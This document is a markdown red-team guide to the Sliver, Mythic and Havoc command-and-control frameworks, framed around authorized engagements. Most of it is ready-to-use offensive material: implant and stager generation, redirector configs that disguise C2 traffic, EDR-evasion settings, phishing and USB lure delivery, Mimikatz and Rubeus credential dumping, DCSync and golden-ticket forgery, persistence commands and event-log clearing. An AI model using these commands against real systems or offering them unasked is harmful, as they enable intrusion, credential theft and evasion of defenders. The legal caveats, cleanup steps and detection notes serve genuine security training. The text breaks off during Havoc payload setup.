> Continuation with more red team tools that are used

`let us discuss about the three succesors of the powershell empire: silver , mythic and havoc`

---
## Silver (by bishop fox) : opensource c2 platform 

> Scope: standing up your own Sliver infrastructure and operating it for an authorized red team engagement. This is a genuinely different category from everything else in this series — it establishes real, working remote access on real machines, not passive analysis.

---

## 0. GROUND RULES — READ THIS FIRST

1. Sliver's entire purpose is remote command execution on a target machine. Only ever run an implant against systems you own outright or have **explicit, signed, scoped authorization** to test. Unauthorized use is a serious crime in essentially every jurisdiction (CFAA in the US, the Computer Misuse Act in the UK, equivalents almost everywhere else) — the tool being free and open source changes nothing about the legality of where you point it.

2. Your Sliver server *is* sensitive infrastructure the moment a listener is live — it holds active backdoor access to whatever calls back to it. A compromised C2 server mid-engagement is a compromised client, full stop.

3. Getting initial access onto a target (phishing, an exploited vulnerability, physical access) is a separate phase of an engagement with its own authorization and its own tradecraft — this guide starts from "you already have execution," not before it.

---

### 1. WHAT IT ACTUALLY IS

Sliver is Bishop Fox's open-source, cross-platform adversary-emulation/red-team framework, written in Go — positioned explicitly as a free alternative to Cobalt Strike. Implants support callback over **mTLS, WireGuard, HTTP(S), and DNS**, and each compiled implant gets its own per-binary asymmetric encryption keypair.

**Core terminology, since it's used constantly below:**

| Term | Meaning |
|---|---|
| Implant | The compiled binary placed on the target |
| Session | An interactive, real-time connection — the implant holds the channel open |
| Beacon | An asynchronous, task-based connection — checks in on an interval, pulls queued tasks, posts results, sleeps again |
| Listener | The server-side service waiting for implant callbacks over a chosen protocol |

**Why client-server split matters:** the listener (server) and the operator's console (client) are separate processes. A dropped client connection or a stray Ctrl+C doesn't kill the server or drop any active callbacks, and multiple operators can connect to one server for a coordinated multi-person engagement.

---

### 2. INSTALLATION

```bash
# official one-liner — installs client + server, compiles from source
curl https://sliver.sh/install | sudo bash
```

**Worth knowing before you run that:** piping straight into `sudo bash` is exactly the kind of thing worth a quick look first — `curl https://sliver.sh/install` on its own to read the script before re-running with `| sudo bash` costs you nothing.

**Alternative — prebuilt binaries from GitHub releases**, if you'd rather not compile from source:

```bash
mkdir /opt/sliver && cd /opt/sliver
wget https://github.com/BishopFox/sliver/releases/download/<version>/sliver-server_linux
wget https://github.com/BishopFox/sliver/releases/download/<version>/sliver-client_linux
chmod +x sliver-server_linux sliver-client_linux
```

**Alternative — systemd service install** (from the official wiki's install script), which also sets up the Windows cross-compiler dependencies (mingw) needed for building Windows implants and configures multiplayer for your user:

```bash
curl https://gist.githubusercontent.com/moloch--/43fd12a704f47deaebbedab2f5be15ba/raw/8a3749e003a8b364c7454a9c059bacc0b2173b98/install-sliver.sh | /bin/bash
```

Once installed, run `sliver` to drop into the operator console.

---

### 3. LISTENERS — GETTING CALLBACKS TO LAND SOMEWHERE

```
sliver > mtls --lhost <ip> --lport 8888
sliver > http --lhost <ip> --lport 8088
sliver > https --lhost <ip> --lport 443 --domain <domain>
sliver > dns --lhost <ip> --domains <domain>
sliver > wg --lhost <ip> --lport 51820

sliver > jobs           # list every active listener
sliver > kill <job-id>  # stop one
```

**Operational logic — which protocol, and why:** the Sliver devs explicitly recommend **mTLS or WireGuard** first — both require mutual certificate/key validation before a connection even completes, which is a meaningfully stronger default than a plaintext-adjacent channel. **HTTP(S)** blends into normal web traffic on networks that expect to see it (an implant configured with `--http` tries HTTPS first, falls back to HTTP only if that fails). **DNS** is the most likely to slip past a network that heavily inspects HTTP/TLS, but it's UDP-based, comparatively fragile, and generally not the first protocol to reach for if you're new to the tool.

---

### 4. GENERATING IMPLANTS

**Session vs. Beacon — the first real decision, and it isn't reversible after the fact** (a session-mode implant can't later be converted to beacon mode):

| | Session | Beacon |
|---|---|---|
| Connection style | Persistent, real-time | Interval check-in, then sleeps |
| Interactivity | Immediate — `shell`, `portfwd`, `socks5` work natively | Commands queue, execute on next check-in |
| Noise profile | Higher — constant heartbeat traffic | Lower, especially with jitter |
| Best for | Short interactive windows, hands-on-keyboard work | Long-running engagements, stealth-priority work |

```bash
# session implant, callback over mTLS
generate --mtls <ip>:8888 --os windows --arch amd64 -N <name>

# beacon implant, callback over HTTP, checks in every ~60s with jitter
generate beacon --http <ip>:8088 --seconds 60 --jitter 30 -N <name>
```

**Output formats** — pick based on how the implant needs to land on the target:

```
exe        -> standard standalone binary (default)
shellcode  -> raw position-independent code, run via a small C#/PowerShell/C loader
             stub instead of ever writing a recognizable executable to disk
dll        -> for DLL injection / sideloading scenarios
```

**Profiles + stagers** — for repeatable builds and smaller initial payloads:

```bash
profiles new --http <ip>:8088 --format shellcode <profile-name>
profiles generate --name <profile-name> -N <output-name>

# two-stage delivery: a tiny stager fetches the real implant over HTTP at runtime
stage-listener --url http://<ip>:8443 --profile <profile-name>
generate stager --http <ip>:8443 --arch amd64 --os windows -o stager.bin
```

**When to use a stager instead of a full implant:** whenever your delivery mechanism favors a small initial payload (a macro, a short script, limited buffer space) — the stager itself is tiny and just fetches the full implant from your stage-listener once it executes.

---

### 5. OPERATING ON A TARGET

Once an implant calls back to a live listener:

```
sliver > sessions        # list active sessions
sliver > beacons         # list active beacons
sliver > use <id>        # interact with a specific one
```

From an active session/beacon, the standard post-exploitation command set covers: `ls`/`cd`/`download`/`upload` (filesystem), `ps` (process listing), `shell` (drop to a native shell), `portfwd`/`socks5` (pivoting, session-mode only), `execute-assembly` (run a .NET assembly in-memory), and `screenshot`. Sliver also ships built-in support for **Windows process migration, process injection, and user token manipulation** — these exist to let an operator move an implant's execution context into a more appropriate or longer-lived process, or operate under a different user's token once privilege escalation has occurred during the engagement, rather than to be used as a walkthrough of injection internals here.

---

### 6. ARMORY — THE EXTENSION ECOSYSTEM

```
sliver > armory                  # list what's available
sliver > armory search <regex>   # search by name
sliver > armory install <name>   # install one
sliver > armory install all      # install everything
```

Armory is a community-maintained catalog of extra modules — recon helpers, credential-access tooling (Kerberoasting, Certify-style certificate abuse checks), privilege-escalation aids — that plug straight into an active session. **Treat it like any third-party dependency in a real engagement: review what a module actually does before running it against a client's environment**, since it's a community-contributed catalog, not code Bishop Fox has individually audited end to end.

---

### 7. OPSEC / TRADECRAFT — CONCEPTUAL LEVEL

1. **Beacons with jitter over sessions**, whenever the engagement timeline allows it — the irregular check-in interval is a materially smaller network signature than a constant open connection.
2. **Vary C2 protocols across an engagement** rather than committing everything to one — don't put all implants on mTLS alone if HTTP(S) or WireGuard would blend better with the specific environment.
3. **Symbol obfuscation is on by default** — worth explicitly verifying it's actually present in your production builds rather than assuming.
4. **Name implants meaningfully** with `-N` — on any engagement running more than a couple of footholds, an unnamed session list becomes unreadable fast.
5. **Clean up after yourself.** Removing implants and clearing logs once an authorized engagement concludes isn't optional tradecraft — leaving live backdoor access on a client's systems after the contract ends is a serious professional and ethical failure, independent of how the engagement went.

---

### 8. DETECTION — THE BLUE TEAM SIDE OF THIS SAME TOOL

Worth knowing even as an operator, since it's exactly what you're being tested against:

1. **Outbound connections on common C2 ports** (443, 80, 53) to destinations with no established business relationship to the host.
2. **TLS certificate anomalies** — Sliver generates its own certificates per deployment, which can present differently than a normal CA-issued cert to inspection tooling.
3. **Unusual process parent/child relationships** — the same signal your Volatility phase-1 process triage from the memory forensics guide is built to catch.
4. **EDR behavioral detection tuned for beaconing patterns** — this is precisely what **RITA's beacon score**, from the network forensics extension earlier in this series, is designed to surface: a jittered-but-still-statistically-regular check-in interval is the exact shape RITA scores highest, whether the tool behind it is Sliver, Cobalt Strike, or anything else built the same way.

---

### 9. WORKED EXAMPLE — A FULL AUTHORIZED ENGAGEMENT FLOW

1. Engagement scoped and authorized in writing; rules of engagement confirm target systems and testing windows.
2. Sliver server stood up, `mtls` listener started on the assessment infrastructure.
3. `generate beacon --mtls <ip>:8888 --os windows --arch amd64 --seconds 60 --jitter 30 -N eng01-beacon` — a stealth-priority implant built for a multi-day engagement.
4. Implant delivered via whatever initial-access vector the engagement's separate exploitation phase produced (out of scope for this guide).
5. Beacon checks in; `beacons` shows it live; `use <id>` to start interacting.
6. Post-exploitation via the standard command set, plus any relevant Armory modules reviewed and installed as needed for the specific objective (credential access, lateral movement, etc.).
7. Findings documented as they're made — same discipline as every forensics guide in this series: screenshot/log every action, note the exact command and timestamp that produced each piece of evidence.
8. At engagement close: implants removed from every touched host, logs cleared, and the client report written from the documentation gathered in step 7 — not reconstructed from memory afterward.

---

## Mythic 

## Authorized Red Team Engagement — Mythic C2 Guide

This guide covers using Mythic C2 framework in an authorized red team engagement — from initial setup through post-exploitation, lateral movement, and reporting. Everything here assumes you have a signed Rules of Engagement (RoE) document and written authorization before a single command is run.

---

### PART 1 — Pre-Engagement Setup

#### 1.1 Legal Baseline (non-negotiable before anything else)

```
Signed Statement of Work (SoW)
Signed Rules of Engagement (RoE) — specifying:
  - Scope: IP ranges, domains, physical locations, cloud accounts that are IN scope
  - Out-of-scope systems explicitly named
  - Testing windows (dates, times, time zones)
  - Emergency contact chain on both sides (client + red team lead)
  - Data handling agreement (what happens to captured credentials/data after the engagement)
  - Deconfliction process (how to pause/abort if the blue team detects and escalates)
Get-out-of-jail letter — a signed, physical/digital document you carry at all times during the engagement confirming authorization
```

#### 1.2 Infrastructure Setup

Mythic runs as a Docker-based C2 server. Stand up on an operator-controlled VPS — **never on client infrastructure unless explicitly agreed in the SoW**.

```bash
# Clone and install Mythic
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo ./install_docker_ubuntu.sh       # Ubuntu/Debian
sudo make                              # starts all containers

# Access the Mythic web UI
https://<your-vps-ip>:7443
# Default creds printed on first run — change immediately
```

#### 1.3 Redirectors (operational security — traffic should never hit your Mythic server directly)

```
Client network → Redirector (Apache/nginx/Caddy on a sacrificial VPS) → Mythic teamserver

Apache mod_rewrite redirector example:
  - Legitimate-looking domain (e.g. cdn-updates.com) pointed at the redirector
  - Only requests with a specific User-Agent or URI pattern get forwarded to Mythic
  - All other traffic gets 301'd to a legitimate site (Amazon, Microsoft) so it looks like normal CDN traffic on any network tap
```

```apache
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "LegitimateAgentString" [NC]
RewriteRule ^(.*)$ https://MYTHIC_TEAMSERVER_IP:443/$1 [P,L]
RewriteRule ^(.*)$ https://www.microsoft.com/ [R=301,L]
```

#### 1.4 Install Agents and C2 Profiles

Mythic is agent-agnostic — install the agents you intend to use before the engagement starts:

```bash
# Install agents (run from the Mythic directory)
./mythic-cli install github https://github.com/MythicAgents/apollo      # Windows (.NET)
./mythic-cli install github https://github.com/MythicAgents/poseidon     # Linux/macOS (Go)
./mythic-cli install github https://github.com/MythicAgents/medusa       # cross-platform
./mythic-cli install github https://github.com/MythicAgents/hermes       # macOS (Swift)

# Install C2 profiles
./mythic-cli install github https://github.com/MythicC2Profiles/http      # standard HTTP
./mythic-cli install github https://github.com/MythicC2Profiles/httpx     # advanced HTTP
./mythic-cli install github https://github.com/MythicC2Profiles/smb       # SMB named-pipe (lateral movement)
./mythic-cli install github https://github.com/MythicC2Profiles/tcp       # TCP bind/reverse
./mythic-cli install github https://github.com/MythicC2Profiles/websocket # WebSocket
./mythic-cli install github https://github.com/MythicC2Profiles/dns       # DNS-based comms (egress-restricted networks)
```

---

### PART 2 — Payload Generation

### 2.1 Create a Payload via the UI (standard workflow)

```
Mythic UI → Payloads → Generate New Payload
  → Select OS (Windows / Linux / macOS)
  → Select Agent (Apollo for Windows, Poseidon for Linux/macOS)
  → Select C2 Profile (HTTP/HTTPS for most, SMB for lateral movement, DNS for restricted egress)
  → Configure C2 options:
      Callback host: your redirector domain (not your Mythic IP)
      Callback port: 443 (blend with HTTPS traffic)
      Callback interval: 60s (slow = less detectable)
      Callback jitter: 20% (randomize timing)
      Kill date: set to engagement end date + 1 day
  → Select output format:
      Windows: exe / dll / shellcode / PowerShell / HTA
      Linux/macOS: elf / dylib / shellcode
  → Build
```

#### 2.2 Payload Output Formats (per OS)

**Windows (Apollo):**
```
exe          — standalone executable, noisiest
dll          — for DLL sideloading (less noisy)
shellcode    — raw shellcode for injection into another process
PowerShell   — base64-encoded in-memory loader (stageless)
HTA          — HTML Application for phishing delivery
```

**Linux/macOS (Poseidon):**
```
elf          — Linux executable
dylib        — macOS dynamic library (for hijacking)
shellcode    — raw shellcode for injection
```

#### 2.3 Payload Modifications for EDR Evasion

These are engagement-specific — agree with the client on what evasion is in scope:

```
Obfuscation: compile with different toolchains per payload so signatures differ
Sleep masking: configure agent sleep to encrypt its own heap/stack while dormant (Apollo supports this)
Process injection: use PPID spoofing to spawn the agent under a parent process that looks legitimate
Stomping: overwrite the agent's PE headers in memory post-load so it doesn't show as a mapped file
Sign with a valid code-signing cert if in scope (client may supply their own cert for the assessment)
```

---

## PART 3 — Initial Access

#### 3.1 Phishing (if in scope)

```
Payload delivery options:
  - Macro-enabled Office document containing a shellcode loader (increasingly detected)
  - HTML smuggling: smuggle the payload via a JavaScript blob in an HTML email attachment (harder to detect at the email gateway)
  - ISO/LNK combo: ISO file containing a .lnk that runs the payload — bypasses Mark-of-the-Web (MOTW) since ISO contents don't inherit the MOTW flag
  - OneNote .one file with embedded script/attachment (recent common technique post-macro-by-default change)
  - PDF with embedded URI pointing to a staged payload hosted on a lookalike domain

Delivery infrastructure:
  - Phishing domain aged ≥ 30 days (younger domains hit spam filters harder)
  - Valid DMARC/DKIM/SPF configured on the phishing domain
  - TLS on the delivery site (plain HTTP phish pages get flagged by modern mail gateways)
  - GoPhish for campaign management if tracking link clicks/opens is in scope
```

#### 3.2 Physical / USB (if in scope per RoE)

```
Drop scenario: USB containing an LNK/HTA payload
  - Configured to auto-run on the target OS (LNK double-click triggers payload)
  - Payload phones home to C2 over port 443 (blends with HTTPS)
  - Always label USB "CONFIDENTIAL — HR PAYROLL 2024" or similar social-engineering lure per agreed scenario
```

#### 3.3 Assumed Breach (common starting scenario for mature security programs)

```
Client provides: a standard user account credential, a physical laptop on their network, or access to a specific network segment — the engagement tests lateral movement and detection capability rather than initial access specifically
```

---

### PART 4 — Post-Exploitation with Mythic

Once a callback lands in Mythic (visible in the Active Callbacks panel), the following commands are available across agents. These are the core Mythic task commands — syntax is identical in the Mythic UI's task input field.

#### 4.1 Situational Awareness

```
# Who am I and where am I
shell whoami
shell hostname
shell ipconfig /all          (Windows)
shell ip addr                 (Linux)

# OS and patch level
shell systeminfo              (Windows)
shell uname -a                (Linux)

# Running processes
ps

# Current user privileges
shell whoami /priv            (Windows)

# Network connections from this host
netstat

# Logged-in users
shell query user              (Windows)
shell w                        (Linux)

# Shares visible from this host
shell net share               (Windows)
shell net view /all           (Windows)

# List directory contents
ls
ls C:\Users\
ls /home/

# Read a file
download <filepath>
```

#### 4.2 Credential Access

```
# Dump credentials via LSASS (requires SYSTEM or SeDebugPrivilege — Windows)
# Mythic's Credential module (agent-dependent)
mimikatz sekurlsa::logonpasswords    (Apollo inline Mimikatz — in-memory, avoids writing to disk)

# Dump SAM/SECURITY/SYSTEM hive for offline cracking
mimikatz lsadump::sam

# DPAPI — decrypt browser-stored credentials
mimikatz dpapi::chrome /in:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

# Dump credentials from credential manager
mimikatz vault::cred /patch

# Kerberoasting — request service tickets for offline cracking
powershell Invoke-Kerberoast       (or via Rubeus inline)
execute_assembly Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# AS-REP Roasting — for accounts with pre-auth disabled
execute_assembly Rubeus.exe asreproast /format:hashcat

# DCSync — pull NTLM hashes from DC replication (requires Domain Admin or equivalent)
mimikatz lsadump::dcsync /domain:<domain> /user:krbtgt
mimikatz lsadump::dcsync /domain:<domain> /all /csv
```

#### 4.3 Privilege Escalation

```
# Check for common Windows privesc paths (automated scan)
execute_assembly PowerUp.ps1 Invoke-AllChecks

# Token impersonation (requires SeImpersonatePrivilege — common on service accounts)
mimikatz token::elevate           # elevate to SYSTEM via token impersonation
steal_token <pid>                  # steal token from a specific process

# Named pipe impersonation (classic SYSTEM escalation when SeImpersonatePrivilege is present)
# GodPotato / PrintSpoofer / RoguePotato — upload and execute via:
upload /opt/tools/GodPotato.exe C:\Windows\Temp\gp.exe
shell C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"

# UAC bypass (Windows — various techniques depending on OS build)
execute_assembly UACME.exe <technique_number>
```

##### 4.4 Persistence

Agree with the client which persistence mechanisms are in scope — some organizations explicitly exclude registry/scheduled-task persistence to avoid operational risk to production systems.

```
# Scheduled task (Windows)
shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# Registry run key (Windows)
shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Update" /t REG_SZ /d "C:\Windows\Temp\payload.exe"

# WMI subscription (stealthy, survives reboots, harder to find via simple reg/task inspection)
execute_assembly SharpWMI.exe action=createsubscription wminamespace="root\subscription" ...

# Linux cron
shell echo "* * * * * /tmp/.agent" | crontab -

# macOS LaunchAgent
upload /opt/tools/com.apple.update.plist ~/Library/LaunchAgents/com.apple.update.plist
shell launchctl load ~/Library/LaunchAgents/com.apple.update.plist
```

#### 4.5 Defense Evasion (in-Mythic)

```
# Process injection — inject shellcode into a legitimate process (explorer.exe, svchost.exe)
inject <pid> <shellcode_path>

# PPID spoofing — spawn a process under a chosen parent
spawnto "C:\Windows\System32\svchost.exe"

# Timestomping — modify file timestamps to match surrounding files and avoid standing out in timeline analysis
timestomp <source_file> <target_file>

# Unlink module from PEB (hide from module enumeration)
# Agent-specific — Apollo supports this inline

# Clear event logs (only if explicitly in scope — highly disruptive)
shell wevtutil cl System
shell wevtutil cl Security
shell wevtutil cl Application
```

---

### PART 5 — Lateral Movement

#### 5.1 SMB Lateral Movement (pass-the-hash / pass-the-ticket)

```
# SMB via Mythic's built-in lateral movement (link to an SMB agent already running on the target)
# First: generate an SMB-profile payload and deploy it on the target host
# Then link from your current session:
link smb <target_hostname>

# WMI lateral movement
execute_assembly SharpWMI.exe action=exec computername=<target> command="C:\Windows\Temp\payload.exe"

# PsExec-style (service creation) — noisiest, generates System event 7045
execute_assembly SharpSC.exe create <target> <service_name> <payload_path>

# DCOM lateral movement (less noisy than PsExec)
execute_assembly SharpCOM.exe <target> <payload_path>

# WinRM (if enabled, very quiet)
execute_assembly Invoke-WMIMethod.ps1 ...
```

#### 5.2 Pass-the-Hash / Pass-the-Ticket

```
# Pass-the-Hash — use NTLM hash directly without cracking it
mimikatz sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe

# Pass-the-Ticket — inject a Kerberos ticket for impersonation
execute_assembly Rubeus.exe ptt /ticket:<base64_ticket>

# Overpass-the-Hash — convert NTLM hash to Kerberos TGT
execute_assembly Rubeus.exe asktgt /user:<user> /ntlm:<hash> /domain:<domain> /ptt

# Golden Ticket — forge a TGT using the krbtgt hash (obtained via DCSync)
mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ptt

# Silver Ticket — forge a service ticket for a specific service (no DC contact needed)
mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /target:<target_host> /service:cifs /rc4:<machine_account_hash> /ptt
```

#### 5.3 Linked Agents (Peer-to-Peer, no direct internet required from each hop)

```
# After deploying an SMB payload on a target host that has no direct internet access:
link smb <hostname>           # link current callback → the SMB agent on target
# Traffic now flows: Mythic → Internet-connected host → SMB pipe → target host

# TCP link (when SMB is blocked/monitored)
link tcp <ip>:<port>

# Unlink when done
unlink <agent_uuid>
```

---

### PART 6 — Active Directory Attacks

```
# BloodHound data collection (map AD relationships, find paths to Domain Admin)
execute_assembly SharpHound.exe -c All --zipfilename bloodhound.zip
download bloodhound.zip
# Import into BloodHound UI → right-click "Find Shortest Paths to Domain Admins"

# LDAP enumeration
execute_assembly ADSearch.exe --search "(&(objectCategory=person)(objectClass=user)(adminCount=1))"

# Find accounts with unconstrained delegation (high-value targets for printer bug/SpoolSample)
execute_assembly ADSearch.exe --search "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Find accounts with constrained delegation
execute_assembly ADSearch.exe --search "(msDS-AllowedToDelegateTo=*)"

# Printer Bug / SpoolSample — force a DC to authenticate to your host (capture TGT)
execute_assembly SpoolSample.exe <target_DC> <your_host>     # requires unconstrained delegation on your host

# Zerologon check (CVE-2020-1472) — document the finding, DO NOT exploit unless explicitly authorized in RoE
execute_assembly SharpZeroLogon.exe <DC_hostname>

# AdminSDHolder abuse (persistence via AD ACL)
execute_assembly SharpADWS.exe ...
```

---

### PART 7 — Exfiltration Simulation

Most engagements only *simulate* exfiltration rather than actually moving real sensitive data — confirm explicitly in the RoE which approach is authorized.

```
# Simulate exfiltration — create a canary/dummy file of equivalent size and upload it to your C2
shell echo "SIMULATED_SENSITIVE_DATA_EXFIL_TEST" > C:\Windows\Temp\exfil_test.txt
download C:\Windows\Temp\exfil_test.txt

# DNS exfiltration simulation (tests whether DNS-based data egress is detected)
# (use dnscat2 or a custom DNS C2 profile, only against in-scope infrastructure)

# HTTPS exfiltration (standard — most C2 comms are already this channel)
# Test whether DLP controls alert on large transfers:
# Create a dummy file matching a sensitive type (e.g., fake SSNs in a .csv) and download it via the agent
```

---

### PART 8 — Cleanup (Required at Engagement End)

This step is as important as the exploitation phase — leaving artifacts behind after the engagement is a serious professional failure.

```
# Remove all uploaded files
shell del C:\Windows\Temp\*.exe /f /q
shell del C:\Windows\Temp\*.dll /f /q

# Remove scheduled tasks created during the engagement
shell schtasks /delete /tn "WindowsUpdate" /f

# Remove registry run keys
shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Update" /f

# Remove WMI subscriptions if created
execute_assembly SharpWMI.exe action=deletesubscription ...

# Unlink all peer-to-peer agents
unlink <agent_uuid>

# Remove Linux artifacts
shell rm -f /tmp/.agent /tmp/payload

# Remove macOS LaunchAgent
shell launchctl unload ~/Library/LaunchAgents/com.apple.update.plist
shell rm ~/Library/LaunchAgents/com.apple.update.plist

# Kill all callbacks cleanly from Mythic UI
# Callbacks → select all → Exit

# Document every artifact removed for the cleanup section of the final report
```

---

### PART 9 — Reporting Structure

A red team report contains at minimum:

```
1. Executive Summary (1–2 pages, non-technical)
   - What was tested, when, by whom
   - Highest-impact findings in plain language
   - Overall risk rating
   - Top 3–5 strategic recommendations

2. Methodology
   - Phases of the engagement (recon, initial access, post-exploitation, lateral movement, objectives)
   - Tools used
   - Testing windows observed

3. Attack Narrative (chronological timeline)
   - Exact steps taken from initial access through objective completion
   - Timestamps for each significant action (important for blue team debrief)
   - Screenshots of each stage

4. Findings (one finding per page minimum)
   - Finding title
   - Severity (Critical/High/Medium/Low/Informational)
   - CVSS score if applicable
   - CWE/MITRE ATT&CK technique ID (e.g., T1078 — Valid Accounts)
   - Description: what is the vulnerability/weakness
   - Evidence: screenshot, command output, captured hash
   - Impact: what an attacker could achieve in a real incident
   - Recommendation: specific, actionable remediation

5. Objectives Summary
   - Which objectives were achieved (e.g., Domain Admin, access to finance system, exfil of HR data equivalent)
   - Which were not achieved and why

6. Appendices
   - Full tool list with versions
   - All C2 infrastructure IPs/domains used (for blue team blocklist)
   - Full list of accounts, credentials, and data accessed during the engagement
   - Cleanup confirmation log
```

--- 

## Tooling Checklist (Preload Before Engagement Start)

```
Mythic C2 (server + agents + C2 profiles)   — core C2 platform
Apollo / Poseidon / Hermes / Medusa          — agents (Windows/Linux/macOS)
Rubeus                                         — Kerberos attacks
Mimikatz (inline via Apollo)                   — credential dumping
SharpHound / BloodHound                         — AD graph analysis
ADSearch                                          — AD LDAP queries
SharpWMI / SharpSC / SharpCOM                     — lateral movement
PowerUp / SharpUp                                   — Windows privesc checks
GodPotato / PrintSpoofer                              — SeImpersonatePrivilege escalation
GoPhish (if phishing is in scope)                      — phishing campaign management
mod_rewrite redirector config                            — C2 traffic redirector
Cobalt Strike BOF compatibility (if using BOFs with Apollo)
```

---

**Standing operational reminder:** Every action in Mythic generates a timestamped log automatically — your operator logs are part of your deliverable, not just notes. Export the full Mythic task log at engagement end and include it as an appendix. It also protects you legally: if anything goes wrong, you have a granular, timestamped record of exactly what was done and when, which directly maps back to the authorized RoE window.

---

## Authorized Red Team Engagement — Havoc C2 Framework Guide

This guide covers using the Havoc C2 framework in an authorized red team engagement — from initial setup through post-exploitation, lateral movement, evasion, and reporting. Everything here assumes a signed Rules of Engagement (RoE) document and written authorization before a single command runs. Havoc is distinct from Mythic in one critical design choice: its primary agent, the Demon, is written in C and x86-64 assembly, giving it indirect syscalls, sleep obfuscation, and stack spoofing baked in by default rather than as add-ons.

---

### PART 1 — Pre-Engagement Setup

#### 1.1 Legal Baseline (non-negotiable before anything else)

```
Signed Statement of Work (SoW)
Signed Rules of Engagement (RoE) — specifying:
  - Scope: IP ranges, domains, cloud accounts, physical locations IN scope
  - Out-of-scope systems explicitly listed
  - Testing windows (dates, times, time zones)
  - Emergency contact chain on both sides (client CISO/SOC lead + red team lead)
  - Data handling agreement (all captured credentials/hashes/data destroyed at engagement end)
  - Deconfliction process (how to pause/abort if SOC escalates beyond expected response)
Get-out-of-jail letter — signed physical/digital document confirming authorization, carried at all times
```

#### 1.2 Havoc-Specific Architecture

Havoc has three components — understand all three before standing anything up:

```
Teamserver   — Go-based backend, manages listeners, parses callbacks, stores loot
               Runs on Linux (Kali/Debian/Ubuntu) — never on client infrastructure
Client        — C++/Qt5 GUI, connects to teamserver, used by all operators simultaneously (multiplayer)
               Can run on Linux/Windows/macOS — connects to teamserver over a configured port
Demon         — The agent (implant) deployed on target systems
               Written in C + assembly, lightweight, evasion-first design
               Communicates back via HTTP/S or SMB named pipe
```

#### 1.3 Installation and Build

```bash
# Dependencies
sudo apt update && sudo apt install -y \
  golang-go python3 python3-pip nasm mingw-w64 \
  cmake libssl-dev libffi-dev python3-dev build-essential \
  apt-transport-https pkg-config git

# Clone Havoc
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build the teamserver
cd teamserver
go mod download
go build -o teamserver main.go

# Build the client (requires Qt5 dev packages)
sudo apt install -y qt5-default qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools
cd ../client
mkdir build && cd build
cmake ..
make -j$(nproc)
```

#### 1.4 Teamserver Profile Configuration

Havoc uses a `.yaotl` (HCL-like) profile file to configure all listener and agent parameters. Create one before starting the teamserver:

```hcl
# /opt/havoc/profiles/engagement.yaotl

Teamserver {
    Host = "0.0.0.0"
    Port = 40056               # teamserver port — never expose this directly to the internet
}

Operators {
    user "operator1" {
        Password = "StrongPassword1!"
    }
    user "operator2" {
        Password = "StrongPassword2!"
    }
}

# HTTP Listener profile
Listeners {
    Http {
        Name         = "main-https"
        Hosts        = ["your.redirector.domain"]
        HostBind     = "0.0.0.0"
        PortBind     = 443
        PortConn     = 443
        Secure       = true          # HTTPS
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        Uris         = ["/jquery-3.3.1.min.js", "/assets/img/logo.png", "/api/v1/status"]
        Headers      = [
            "Content-type: application/octet-stream",
            "Connection: keep-alive"
        ]
        Response {
            Headers = [
                "Content-type: application/octet-stream",
                "X-Amz-Cf-Pop: LAX3-C2"        # blend with AWS CloudFront traffic
            ]
        }
    }
}

# Demon agent profile
Demon {
    SleepMask       = true            # Ekko/FOLIAGE sleep obfuscation
    SleepMaskTechnique = "Ekko"       # encrypt heap+stack while sleeping
    Jitter          = 20              # ±20% sleep interval randomization
    IndirectSyscall = true            # route Nt* calls through ntdll stubs (bypasses user-mode EDR hooks)
    StackSpoof      = true            # spoof return addresses on the call stack
    Injection {
        Spawn64 = "C:\\Windows\\System32\\WerFault.exe"    # process to spawn for post-ex operations
        Spawn32 = "C:\\Windows\\SysWOW64\\WerFault.exe"
    }
}
```

#### 1.5 Start Teamserver and Connect Client

```bash
# Start teamserver with profile
cd /opt/Havoc/teamserver
sudo ./teamserver server --profile /opt/havoc/profiles/engagement.yaotl

# Connect via GUI client (on operator machine)
# Open Havoc client → Connect → enter teamserver IP:port + operator credentials

# Connect via CLI (headless operator scenario)
./client --host <teamserver_ip> --port 40056 --user operator1 --password StrongPassword1!
```

#### 1.6 Redirector Setup (OPSEC — mandatory before going live)

```
Traffic flow: Target → Redirector (VPS) → Havoc Teamserver

Never point a Demon directly at your teamserver IP.
Use an aged domain (≥30 days) with valid TLS cert for the redirector.
```

```nginx
# Nginx redirector config — only forward traffic matching Havoc URI patterns
server {
    listen 443 ssl;
    server_name your.redirector.domain;

    ssl_certificate /etc/letsencrypt/live/your.redirector.domain/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your.redirector.domain/privkey.pem;

    # Forward matching Havoc URIs to teamserver
    location ~* ^/(jquery-3\.3\.1\.min\.js|assets/img/logo\.png|api/v1/status)$ {
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Everything else → legitimate site (blend in)
    location / {
        return 301 https://www.microsoft.com/;
    }
}
```

---

### PART 2 — Payload (Demon) Generation

#### 2.1 Generate a Demon via the GUI

```
Havoc Client → Attack → Payload
  → Listener: select your configured HTTP/S listener
  → Agent Type: Demon
  → Architecture: x64 (x86 available but rarely needed)
  → Format:
      Windows Exe        — standalone binary (noisiest)
      Windows Dll        — for DLL sideloading (quieter)
      Windows Shellcode  — raw shellcode for custom loaders (quietest — preferred)
      Windows Service Exe — for service-based installation
  → Sleep: 60 (seconds between callbacks — longer = less noisy)
  → Jitter: 20 (percent)
  → Config:
      Indirect Syscall: Enabled
      Stack Spoofing: Enabled
      Sleep Mask: Ekko (or FOLIAGE)
      Spawn To: C:\Windows\System32\WerFault.exe
  → Build → Download
```

